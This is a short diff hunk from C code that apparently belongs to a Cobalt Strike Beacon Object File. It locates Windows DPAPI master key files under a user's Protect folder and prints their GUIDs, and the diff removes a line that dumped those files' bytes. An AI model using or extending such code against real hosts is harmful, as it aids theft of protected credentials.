@@ -90,7 +90,6 @@ void parseFile(char* filePath) {
                         snprintf(mkPath, MAX_PATH, "%s\\AppData\\Roaming\\Microsoft\\Protect\\%s\\%s", 
                                  szProfilePath, szSid, guidStr);
                         BeaconFormatPrintf(&outputbuffer, "[*] Master Key GUID: %s\n", guidStr);
-                        dumpFileBytes(mkPath);
                     }
                     KERNEL32$LocalFree(tempSid); // Free the one allocated by Windows
                 }
